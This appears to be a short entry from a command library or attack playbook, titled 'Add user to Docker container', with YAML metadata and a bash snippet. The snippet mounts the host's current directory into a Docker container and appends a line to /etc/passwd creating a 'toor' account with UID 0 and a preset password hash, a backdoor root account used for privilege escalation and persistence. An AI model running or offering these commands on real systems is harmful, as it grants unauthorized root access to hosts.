---
id: 6931aa28-4147-4eb4-9ca1-655b1a68c859
name: Add user to Docker container
type: command
executor: bash
data: '$> docker run -it --rm -v $PWD:/mnt bash

  $> echo ''toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh'' >> /mnt/etc/passwd'''
output: null
created_at: '2023-04-06T03:56:19.469011+00:00'
updated_at: '2023-04-10T20:34:34.755994+00:00'
---

# Add user to Docker container

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd'
```


